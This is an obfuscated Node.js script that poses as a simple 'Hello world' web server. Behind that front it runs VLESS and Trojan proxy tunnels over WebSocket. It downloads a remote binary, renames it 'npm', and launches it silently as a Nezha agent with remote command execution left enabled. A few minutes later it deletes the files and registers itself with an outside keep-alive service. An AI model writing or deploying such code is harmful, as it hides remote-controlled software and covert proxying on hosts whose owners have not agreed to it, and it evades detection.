function _0x1375(_0x5be784,_0x18982c){_0x5be784=_0x5be784-0x135;const _0x42a9a2=_0x42a9();let _0x137562=_0x42a9a2[_0x5be784];return _0x137562;}const _0x2e0b0c=_0x1375;(function(_0x23f842,_0x4b53b7){const _0x3233c8=_0x1375,_0x4a3e70=_0x23f842();while(!![]){try{const _0x36a78b=-parseInt(_0x3233c8(0x14e))/0x1+-parseInt(_0x3233c8(0x1b1))/0x2+-parseInt(_0x3233c8(0x176))/0x3+-parseInt(_0x3233c8(0x1b0))/0x4+-parseInt(_0x3233c8(0x178))/0x5+parseInt(_0x3233c8(0x148))/0x6+parseInt(_0x3233c8(0x161))/0x7;if(_0x36a78b===_0x4b53b7)break;else _0x4a3e70['push'](_0x4a3e70['shift']());}catch(_0xf62c66){_0x4a3e70['push'](_0x4a3e70['shift']());}}}(_0x42a9,0x54d4b));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x2e0b0c(0x13a)),net=require(_0x2e0b0c(0x16b)),path=require(_0x2e0b0c(0x192)),crypto=require(_0x2e0b0c(0x1aa)),{Buffer}=require(_0x2e0b0c(0x160)),{exec,execSync}=require(_0x2e0b0c(0x182)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2e0b0c(0x18d)]||'86a686ef-ce43-4004-aa56-8d09e4e07609',NEZHA_SERVER=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x1a8)]||'',NEZHA_PORT=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x18f)]||'',NEZHA_KEY=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x18c)]||'',DOMAIN=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x137)]||_0x2e0b0c(0x142),AUTO_ACCESS=process['env'][_0x2e0b0c(0x145)]||![],WSPATH=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x1b4)]||UUID[_0x2e0b0c(0x171)](0x0,0x8),SUB_PATH=process['env'][_0x2e0b0c(0x150)]||_0x2e0b0c(0x173),NAME=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x17b)]||'',PORT=process[_0x2e0b0c(0x187)][_0x2e0b0c(0x197)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x34ee7c=_0x2e0b0c;try{const _0x3bfc09=await axios[_0x34ee7c(0x17f)](_0x34ee7c(0x135)),_0x1adaf2=_0x3bfc09[_0x34ee7c(0x17d)];ISP=(_0x1adaf2[_0x34ee7c(0x167)]+'-'+_0x1adaf2[_0x34ee7c(0x16f)])[_0x34ee7c(0x15a)](/ /g,'_');}catch(_0x32769d){ISP=_0x34ee7c(0x157);}};GetISP();const httpServer=http['createServer']((_0x1ff749,_0x3b8ec1)=>{const _0x4793c4=_0x2e0b0c;if(_0x1ff749['url']==='/'){const _0x48381a=path[_0x4793c4(0x155)](__dirname,_0x4793c4(0x19f));fs[_0x4793c4(0x14a)](_0x48381a,'utf8',(_0x4e4287,_0x3a1d5a)=>{const _0x2b71bc=_0x4793c4;if(_0x4e4287){_0x3b8ec1[_0x2b71bc(0x14d)](0xc8,{'Content-Type':_0x2b71bc(0x1b5)}),_0x3b8ec1[_0x2b71bc(0x188)](_0x2b71bc(0x18b));return;}_0x3b8ec1[_0x2b71bc(0x14d)](0xc8,{'Content-Type':_0x2b71bc(0x1b5)}),_0x3b8ec1['end'](_0x3a1d5a);});return;}else{if(_0x1ff749[_0x4793c4(0x169)]==='/'+SUB_PATH){const _0xfd608c=NAME?NAME+'-'+ISP:ISP,_0x18d2c9='vless://'+UUID+_0x4793c4(0x174)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4793c4(0x183)+WSPATH+'#'+_0xfd608c,_0x22a57=_0x4793c4(0x13f)+UUID+_0x4793c4(0x1a0)+DOMAIN+_0x4793c4(0x1a2)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0xfd608c,_0x3c5d1e=_0x18d2c9+'\x0a'+_0x22a57,_0x113f43=Buffer[_0x4793c4(0x13b)](_0x3c5d1e)[_0x4793c4(0x13c)](_0x4793c4(0x198));_0x3b8ec1[_0x4793c4(0x14d)](0xc8,{'Content-Type':'text/plain'}),_0x3b8ec1[_0x4793c4(0x188)](_0x113f43+'\x0a');}else _0x3b8ec1[_0x4793c4(0x14d)](0x194,{'Content-Type':'text/plain'}),_0x3b8ec1[_0x4793c4(0x188)](_0x4793c4(0x175));}}),wss=new WebSocket[(_0x2e0b0c(0x138))]({'server':httpServer}),uuid=UUID[_0x2e0b0c(0x15a)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x2e0b0c(0x18a)];function _0x42a9(){const _0x5c609d=['trojan://','includes','catch','1234.abc.com','https://','arm64','AUTO_ACCESS','message','2083','2447178lsVlKw','client_secret:\x20','readFile','write','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','writeHead','512679JZBcfL','Server\x20is\x20running\x20on\x20port\x20','SUB_PATH','listen','connect','application/dns-json','then','join','https://amd64.ssss.nyc.mn/v1','Unknown','sha224','map','replace','stream','chmod\x20+x\x20npm','readUInt8','trim','error','buffer','9352504RWcQtM','send','test','error:\x20','false','true','country','--tls','url','npm\x20is\x20running','net','find','npm\x20running\x20error:','createHash','asOrganization','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','slice','2087','sub','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','Not\x20Found\x0a','801759suLyZD','concat','1300820dJlvpG','application/json','config.yaml','NAME','/bin/bash','data','npm','get','post','arch','child_process','&path=%2F','finish','unlink','arm','env','end','pipe','1.1.1.1','Hello\x20world!','NEZHA_KEY','UUID','2096','NEZHA_PORT','https://dns.google/resolve?name=','type','path','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Automatic\x20Access\x20Task\x20added\x20successfully','every','decode','PORT','base64','split','connection','443','&type=A','https://arm64.ssss.nyc.mn/v1','log','index.html','@cdns.doon.eu.org:443?security=tls&sni=','length','&fp=chrome&type=ws&host=','substr','pop','https://oooo.serv00.net/add-url','readUInt16BE','https://arm64.ssss.nyc.mn/agent','NEZHA_SERVER','Answer','crypto','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','close','reduce','191676DsNgRb','616906xBfIBh','\x20-p\x20','once','WSPATH','text/html','https://speed.cloudflare.com/meta','2053','DOMAIN','Server','utf-8','axios','from','toString','writeFileSync','https://amd64.ssss.nyc.mn/agent'];_0x42a9=function(){return _0x5c609d;};return _0x42a9();}function resolveHost(_0x31bb2a){return new Promise((_0x24d51b,_0x2f0062)=>{const _0x1b3a67=_0x1375;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1b3a67(0x163)](_0x31bb2a)){_0x24d51b(_0x31bb2a);return;}let _0x28bbdb=0x0;function _0xd1e202(){const _0x552d01=_0x1b3a67;if(_0x28bbdb>=DNS_SERVERS[_0x552d01(0x1a1)]){_0x2f0062(new Error('Failed\x20to\x20resolve\x20'+_0x31bb2a+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3d8466=DNS_SERVERS[_0x28bbdb];_0x28bbdb++;const _0x4c9226=_0x552d01(0x190)+encodeURIComponent(_0x31bb2a)+_0x552d01(0x19c);axios[_0x552d01(0x17f)](_0x4c9226,{'timeout':0x1388,'headers':{'Accept':_0x552d01(0x153)}})[_0x552d01(0x154)](_0x280b8f=>{const _0x14ed66=_0x552d01,_0x5da891=_0x280b8f['data'];if(_0x5da891['Status']===0x0&&_0x5da891['Answer']&&_0x5da891['Answer'][_0x14ed66(0x1a1)]>0x0){const _0x3bd029=_0x5da891[_0x14ed66(0x1a9)][_0x14ed66(0x16c)](_0x215a1b=>_0x215a1b[_0x14ed66(0x191)]===0x1);if(_0x3bd029){_0x24d51b(_0x3bd029[_0x14ed66(0x17d)]);return;}}_0xd1e202();})['catch'](_0x178dc2=>{_0xd1e202();});}_0xd1e202();});}function handleVlessConnection(_0x2d565f,_0x32fa31){const _0x5f25a5=_0x2e0b0c,[_0xa8c209]=_0x32fa31,_0x56fc5a=_0x32fa31['slice'](0x1,0x11);if(!_0x56fc5a[_0x5f25a5(0x195)]((_0x2d930e,_0x4bfaf2)=>_0x2d930e==parseInt(uuid['substr'](_0x4bfaf2*0x2,0x2),0x10)))return![];let _0x20080e=_0x32fa31[_0x5f25a5(0x171)](0x11,0x12)[_0x5f25a5(0x15d)]()+0x13;const _0x424c44=_0x32fa31[_0x5f25a5(0x171)](_0x20080e,_0x20080e+=0x2)['readUInt16BE'](0x0),_0x5c7463=_0x32fa31['slice'](_0x20080e,_0x20080e+=0x1)[_0x5f25a5(0x15d)](),_0x130fcd=_0x5c7463==0x1?_0x32fa31['slice'](_0x20080e,_0x20080e+=0x4)['join']('.'):_0x5c7463==0x2?new TextDecoder()[_0x5f25a5(0x196)](_0x32fa31[_0x5f25a5(0x171)](_0x20080e+0x1,_0x20080e+=0x1+_0x32fa31[_0x5f25a5(0x171)](_0x20080e,_0x20080e+0x1)[_0x5f25a5(0x15d)]())):_0x5c7463==0x3?_0x32fa31[_0x5f25a5(0x171)](_0x20080e,_0x20080e+=0x10)[_0x5f25a5(0x1af)]((_0x18ca41,_0x2ec79a,_0x4d1c31,_0x23a3ba)=>_0x4d1c31%0x2?_0x18ca41[_0x5f25a5(0x177)](_0x23a3ba[_0x5f25a5(0x171)](_0x4d1c31-0x1,_0x4d1c31+0x1)):_0x18ca41,[])[_0x5f25a5(0x159)](_0xe1386b=>_0xe1386b[_0x5f25a5(0x1a6)](0x0)['toString'](0x10))['join'](':'):'';_0x2d565f[_0x5f25a5(0x162)](new Uint8Array([_0xa8c209,0x0]));const _0x4c3d4e=createWebSocketStream(_0x2d565f);return resolveHost(_0x130fcd)[_0x5f25a5(0x154)](_0x10d6ae=>{const _0x22016e=_0x5f25a5;net[_0x22016e(0x152)]({'host':_0x10d6ae,'port':_0x424c44},function(){const _0x336cbf=_0x22016e;this[_0x336cbf(0x14b)](_0x32fa31[_0x336cbf(0x171)](_0x20080e)),_0x4c3d4e['on'](_0x336cbf(0x15f),()=>{})[_0x336cbf(0x189)](this)['on'](_0x336cbf(0x15f),()=>{})[_0x336cbf(0x189)](_0x4c3d4e);})['on'](_0x22016e(0x15f),()=>{});})[_0x5f25a5(0x141)](_0x4c4757=>{const _0x5d9704=_0x5f25a5;net[_0x5d9704(0x152)]({'host':_0x130fcd,'port':_0x424c44},function(){const _0x4fe7f7=_0x5d9704;this[_0x4fe7f7(0x14b)](_0x32fa31['slice'](_0x20080e)),_0x4c3d4e['on']('error',()=>{})['pipe'](this)['on'](_0x4fe7f7(0x15f),()=>{})[_0x4fe7f7(0x189)](_0x4c3d4e);})['on'](_0x5d9704(0x15f),()=>{});}),!![];}function handleTrojanConnection(_0x2a691c,_0xc7f9c){const _0x6886d6=_0x2e0b0c;try{if(_0xc7f9c[_0x6886d6(0x1a1)]<0x3a)return![];const _0x49eda1=_0xc7f9c[_0x6886d6(0x171)](0x0,0x38)[_0x6886d6(0x13c)](),_0x342d53=[UUID];let _0x58d45a=null;for(const _0x4da679 of _0x342d53){const _0x43e9cb=crypto[_0x6886d6(0x16e)](_0x6886d6(0x158))['update'](_0x4da679)['digest']('hex');if(_0x43e9cb===_0x49eda1){_0x58d45a=_0x4da679;break;}}if(!_0x58d45a)return![];let _0x1f8f2c=0x38;_0xc7f9c[_0x1f8f2c]===0xd&&_0xc7f9c[_0x1f8f2c+0x1]===0xa&&(_0x1f8f2c+=0x2);const _0x39e9c0=_0xc7f9c[_0x1f8f2c];if(_0x39e9c0!==0x1)return![];_0x1f8f2c+=0x1;const _0x194c6b=_0xc7f9c[_0x1f8f2c];_0x1f8f2c+=0x1;let _0x23a518,_0x51cf3c;if(_0x194c6b===0x1)_0x23a518=_0xc7f9c[_0x6886d6(0x171)](_0x1f8f2c,_0x1f8f2c+0x4)['join']('.'),_0x1f8f2c+=0x4;else{if(_0x194c6b===0x3){const _0x2ed464=_0xc7f9c[_0x1f8f2c];_0x1f8f2c+=0x1,_0x23a518=_0xc7f9c[_0x6886d6(0x171)](_0x1f8f2c,_0x1f8f2c+_0x2ed464)['toString'](),_0x1f8f2c+=_0x2ed464;}else{if(_0x194c6b===0x4)_0x23a518=_0xc7f9c['slice'](_0x1f8f2c,_0x1f8f2c+0x10)['reduce']((_0x543749,_0x57835b,_0x277c30,_0x45d90a)=>_0x277c30%0x2?_0x543749[_0x6886d6(0x177)](_0x45d90a[_0x6886d6(0x171)](_0x277c30-0x1,_0x277c30+0x1)):_0x543749,[])['map'](_0x5143b4=>_0x5143b4[_0x6886d6(0x1a6)](0x0)['toString'](0x10))[_0x6886d6(0x155)](':'),_0x1f8f2c+=0x10;else return![];}}_0x51cf3c=_0xc7f9c[_0x6886d6(0x1a6)](_0x1f8f2c),_0x1f8f2c+=0x2;_0x1f8f2c<_0xc7f9c[_0x6886d6(0x1a1)]&&_0xc7f9c[_0x1f8f2c]===0xd&&_0xc7f9c[_0x1f8f2c+0x1]===0xa&&(_0x1f8f2c+=0x2);const _0x177bca=createWebSocketStream(_0x2a691c);return resolveHost(_0x23a518)[_0x6886d6(0x154)](_0x4202ea=>{const _0x6073b8=_0x6886d6;net['connect']({'host':_0x4202ea,'port':_0x51cf3c},function(){const _0x5410b1=_0x1375;_0x1f8f2c<_0xc7f9c[_0x5410b1(0x1a1)]&&this[_0x5410b1(0x14b)](_0xc7f9c[_0x5410b1(0x171)](_0x1f8f2c)),_0x177bca['on'](_0x5410b1(0x15f),()=>{})['pipe'](this)['on'](_0x5410b1(0x15f),()=>{})[_0x5410b1(0x189)](_0x177bca);})['on'](_0x6073b8(0x15f),()=>{});})['catch'](_0x4ca3ee=>{const _0x516d96=_0x6886d6;net[_0x516d96(0x152)]({'host':_0x23a518,'port':_0x51cf3c},function(){const _0x1af185=_0x516d96;_0x1f8f2c<_0xc7f9c[_0x1af185(0x1a1)]&&this['write'](_0xc7f9c[_0x1af185(0x171)](_0x1f8f2c)),_0x177bca['on'](_0x1af185(0x15f),()=>{})['pipe'](this)['on'](_0x1af185(0x15f),()=>{})[_0x1af185(0x189)](_0x177bca);})['on']('error',()=>{});}),!![];}catch(_0x1739aa){return![];}}wss['on'](_0x2e0b0c(0x19a),(_0x1f1e0a,_0x1cf78d)=>{const _0x384d6f=_0x2e0b0c,_0x383c36=_0x1cf78d[_0x384d6f(0x169)]||'';_0x1f1e0a[_0x384d6f(0x1b3)](_0x384d6f(0x146),_0x255d54=>{const _0x22f26d=_0x384d6f;if(_0x255d54[_0x22f26d(0x1a1)]>0x11&&_0x255d54[0x0]===0x0){const _0x8c0978=_0x255d54[_0x22f26d(0x171)](0x1,0x11),_0x4179df=_0x8c0978[_0x22f26d(0x195)]((_0x258721,_0x141186)=>_0x258721==parseInt(uuid[_0x22f26d(0x1a3)](_0x141186*0x2,0x2),0x10));if(_0x4179df){!handleVlessConnection(_0x1f1e0a,_0x255d54)&&_0x1f1e0a[_0x22f26d(0x1ae)]();return;}}!handleTrojanConnection(_0x1f1e0a,_0x255d54)&&_0x1f1e0a[_0x22f26d(0x1ae)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5d81dc=_0x2e0b0c,_0x5c3e51=os[_0x5d81dc(0x181)]();return _0x5c3e51===_0x5d81dc(0x186)||_0x5c3e51===_0x5d81dc(0x144)||_0x5c3e51==='aarch64'?!NEZHA_PORT?_0x5d81dc(0x19d):_0x5d81dc(0x1a7):!NEZHA_PORT?_0x5d81dc(0x156):_0x5d81dc(0x13e);},downloadFile=async()=>{const _0x15a54c=_0x2e0b0c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x22e775=getDownloadUrl(),_0xe706f6=await axios({'method':_0x15a54c(0x17f),'url':_0x22e775,'responseType':_0x15a54c(0x15b)}),_0x2b0975=fs['createWriteStream'](_0x15a54c(0x17e));return _0xe706f6[_0x15a54c(0x17d)][_0x15a54c(0x189)](_0x2b0975),new Promise((_0x3bb985,_0x3b1566)=>{const _0x3dde74=_0x15a54c;_0x2b0975['on'](_0x3dde74(0x184),()=>{const _0x1dcf4c=_0x3dde74;console[_0x1dcf4c(0x19e)]('npm\x20download\x20successfully'),exec(_0x1dcf4c(0x15c),_0x7d2de0=>{if(_0x7d2de0)_0x3b1566(_0x7d2de0);_0x3bb985();});}),_0x2b0975['on'](_0x3dde74(0x15f),_0x3b1566);});}catch(_0x5793aa){throw _0x5793aa;}},runnz=async()=>{const _0x29fddb=_0x2e0b0c;try{const _0x3b5939=execSync(_0x29fddb(0x170),{'encoding':_0x29fddb(0x139)});if(_0x3b5939[_0x29fddb(0x15e)]()!==''){console[_0x29fddb(0x19e)](_0x29fddb(0x1ac));return;}}catch(_0x2c3e0b){}await downloadFile();let _0x24c492='',_0x31b081=[_0x29fddb(0x19b),'8443',_0x29fddb(0x18e),_0x29fddb(0x172),_0x29fddb(0x147),_0x29fddb(0x136)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51f617=_0x31b081['includes'](NEZHA_PORT)?_0x29fddb(0x168):'';_0x24c492='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x29fddb(0x1b2)+NEZHA_KEY+'\x20'+_0x51f617+_0x29fddb(0x1ad);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5334fd=NEZHA_SERVER[_0x29fddb(0x140)](':')?NEZHA_SERVER[_0x29fddb(0x199)](':')[_0x29fddb(0x1a4)]():'',_0x181d2a=_0x31b081[_0x29fddb(0x140)](_0x5334fd)?_0x29fddb(0x166):_0x29fddb(0x165),_0x291c2b=_0x29fddb(0x149)+NEZHA_KEY+_0x29fddb(0x14c)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x181d2a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x29fddb(0x13d)](_0x29fddb(0x17a),_0x291c2b);}_0x24c492=_0x29fddb(0x193);}else{console[_0x29fddb(0x19e)](_0x29fddb(0x1ab));return;}}try{exec(_0x24c492,{'shell':_0x29fddb(0x17c)},_0xbb0f4d=>{const _0x20be40=_0x29fddb;if(_0xbb0f4d)console[_0x20be40(0x15f)](_0x20be40(0x16d),_0xbb0f4d);else console[_0x20be40(0x19e)](_0x20be40(0x16a));});}catch(_0x4c8481){console[_0x29fddb(0x15f)](_0x29fddb(0x164)+_0x4c8481);}};async function addAccessTask(){const _0x13b149=_0x2e0b0c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1c7ac9=_0x13b149(0x143)+DOMAIN+'/'+SUB_PATH;try{const _0x51142a=await axios[_0x13b149(0x180)](_0x13b149(0x1a5),{'url':_0x1c7ac9},{'headers':{'Content-Type':_0x13b149(0x179)}});console[_0x13b149(0x19e)](_0x13b149(0x194));}catch(_0x3e4f84){}}const delFiles=()=>{const _0x425bef=_0x2e0b0c;fs[_0x425bef(0x185)](_0x425bef(0x17e),()=>{}),fs[_0x425bef(0x185)]('config.yaml',()=>{});};httpServer[_0x2e0b0c(0x151)](PORT,()=>{const _0x51d22d=_0x2e0b0c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x51d22d(0x19e)](_0x51d22d(0x14f)+PORT);});
